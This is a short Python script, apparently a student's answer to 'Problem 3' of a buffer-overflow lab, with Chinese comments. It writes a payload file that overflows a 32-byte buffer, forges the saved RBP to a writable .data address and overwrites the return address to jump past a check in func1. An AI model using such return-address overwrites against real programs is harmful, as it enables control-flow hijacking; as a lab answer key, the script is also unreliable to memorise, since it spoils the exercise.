import struct

# Problem 3: ASLR Bypass + Jump Past Check
# 战术：我们不传参，而是直接跳转到 func1 检查之后的代码 (0x40122b)。
# 难点：func1 需要使用 RBP 来写字符串，我们需要把 RBP 伪造到一个安全的固定地址。

# 1. 基础配置
padding_length = 32          # Buffer 大小 (rbp - 0x20)

# 2. 伪造的 RBP 地址 (Fake RBP)
# 我们选一个 .data 段的空闲地址。根据反汇编，0x4035xx 被使用了。
# 0x403600 是安全的，固定且可写。
fake_rbp = 0x403600 

# 3. 目标地址 (Target)
# 直接跳到 func1 内部，跳过 cmp 指令
target_address = 0x40122b 

# ==========================================

# 构造 Payload
payload = b'A' * padding_length
payload += struct.pack('<Q', fake_rbp)       # 覆盖 Saved RBP
payload += struct.pack('<Q', target_address) # 覆盖 Return Address

# 写入文件
with open("ans3.txt", "wb") as f:
    f.write(payload)

print(f"Payload generated for Problem 3!")
print(f"Fake RBP: {hex(fake_rbp)} -> Target: {hex(target_address)}")
